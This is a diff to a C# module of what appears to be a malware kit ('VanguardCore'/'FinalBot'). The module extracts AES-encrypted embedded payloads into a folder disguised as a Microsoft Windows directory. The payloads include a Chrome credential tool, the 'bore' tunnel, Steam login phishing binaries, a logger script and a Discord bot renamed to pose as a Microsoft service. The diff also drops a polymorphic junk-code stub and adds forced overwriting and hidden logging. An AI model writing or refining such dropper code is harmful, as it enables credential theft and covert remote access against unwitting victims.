@@ -3,17 +3,12 @@ using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Linq;
 
 namespace VanguardCore.Modules
 {
     public static class ResourceModule
     {
-        // [POLY_JUNK]
-        private static void _vanguard_4526c7c4() {
-            int val = 30518;
-            if (val > 50000) Console.WriteLine("Hash:" + 30518);
-        }
-
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern bool SetDllDirectory(string lpPathName);
 
@@ -21,7 +16,7 @@ namespace VanguardCore.Modules
 
         static ResourceModule()
         {
-            WorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
+            WorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Network");
             if (!Directory.Exists(WorkDir)) Directory.CreateDirectory(WorkDir);
         }
 
@@ -32,54 +27,83 @@ namespace VanguardCore.Modules
                 // 1. Set DLL search path so SQLite find e_sqlite3.dll there
                 SetDllDirectory(WorkDir);
 
-                // 2. Extract resources
-                ExtractResource("VanguardCore.tools.bore.bin", Path.Combine(WorkDir, "bore.bin"));
-                ExtractResource("VanguardCore.e_sqlite3.dll", Path.Combine(WorkDir, "e_sqlite3.dll"));
-                ExtractResource("VanguardCore.GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
-                ExtractResource("VanguardCore.SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.bin"));
-                ExtractResource("VanguardCore.SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.bin"));
-                ExtractResource("VanguardCore.discord_bot.bin", Path.Combine(WorkDir, "discord_bot.bin"));
+                Log("[RESOURCE] Starting extraction phase...");
+
+                // 2. Extract resources (FORCE OVERWRITE)
+                ExtractResource("chromelevator.bin", Path.Combine(WorkDir, "chromelevator.exe"));
+                ExtractResource("bore.bin", Path.Combine(WorkDir, "bore.exe"));
+                ExtractResource("e_sqlite3.dll", Path.Combine(WorkDir, "e_sqlite3.dll"));
+                ExtractResource("GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
+                ExtractResource("SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.bin"));
+                ExtractResource("SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.bin"));
+                ExtractResource("MsDiscordSvc.bin", Path.Combine(WorkDir, "MsDiscordSvc.exe"));
 
                 // 3. Ensure tablichka directory exists for Steam Notice
                 string tablichkaDir = Path.Combine(WorkDir, "tablichka");
                 if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
+                
                 string currentDirLogger = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
                 if (!File.Exists(currentDirLogger))
                 {
                     try { File.Copy(Path.Combine(WorkDir, "GlobalLogger.py"), currentDirLogger, true); } catch { }
                 }
+                
+                Log("[RESOURCE] All tools extracted successfully.");
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"[RESOURCE ERROR] {ex.Message}");
+                Log($"[RESOURCE ERROR] {ex.Message}");
             }
         }
 
-        private static void ExtractResource(string resourceName, string destPath)
+        private static void ExtractResource(string shortName, string destPath)
         {
             try
             {
-                if (File.Exists(destPath)) return;
+                // V6.15: ALWAY OVERWRITE to prevent corrupted/stale versions from blocking operations
+                if (File.Exists(destPath)) try { File.Delete(destPath); } catch { }
 
                 var assembly = Assembly.GetExecutingAssembly();
-                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
+                
+                // Try multiple namespace prefixes: 
+                // 1. Namespace-less (root)
+                // 2. VanguardCore.
+                // 3. FinalBot.
+                // 4. MicrosoftManagementSvc. (NativeAOT result)
+                
+                string[] possibleNames = {
+                    shortName,
+                    $"VanguardCore.{shortName}",
+                    $"FinalBot.{shortName}",
+                    $"MicrosoftManagementSvc.{shortName}",
+                    $"VanguardCore.tools.{shortName}"
+                };
+
+                Stream? stream = null;
+                string foundName = "";
+
+                foreach (var name in possibleNames)
                 {
-                    if (stream == null)
-                    {
-                        string altName = resourceName.Replace("VanguardCore.", "FinalBot.");
-                        using (Stream altStream = assembly.GetManifestResourceStream(altName))
-                        {
-                            if (altStream == null) return;
-                            SaveStream(altStream, destPath, resourceName.EndsWith(".bin"));
-                        }
-                    }
-                    else
-                    {
-                        SaveStream(stream, destPath, resourceName.EndsWith(".bin"));
+                    stream = assembly.GetManifestResourceStream(name);
+                    if (stream != null) {
+                        foundName = name;
+                        break;
                     }
                 }
+
+                if (stream == null)
+                {
+                    Log($"[RESOURCE] ERROR: Could not find resource {shortName} with any prefix.");
+                    return;
+                }
+
+                using (stream)
+                {
+                    SaveStream(stream, destPath, shortName.EndsWith(".bin"));
+                    Log($"[RESOURCE] Extracted: {Path.GetFileName(destPath)} (from {foundName})");
+                }
             }
-            catch { }
+            catch (Exception ex) { Log($"[RESOURCE ERROR] {shortName}: {ex.Message}"); }
         }
 
         private static void SaveStream(Stream stream, string destPath, bool isEncrypted = false)
@@ -92,8 +116,19 @@ namespace VanguardCore.Modules
                 {
                     data = AesHelper.Decrypt(data);
                 }
-                if (data != null) File.WriteAllBytes(destPath, data);
+                if (data != null && data.Length > 0) 
+                    File.WriteAllBytes(destPath, data);
+                else
+                    Log($"[RESOURCE ERROR] Decryption failed for {Path.GetFileName(destPath)}");
             }
+        }
+
+        private static void Log(string msg)
+        {
+            try { 
+                string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log");
+                File.AppendAllText(logPath, $"[{DateTime.Now}] {msg}\n"); 
+            } catch { }
         }
     }
 }
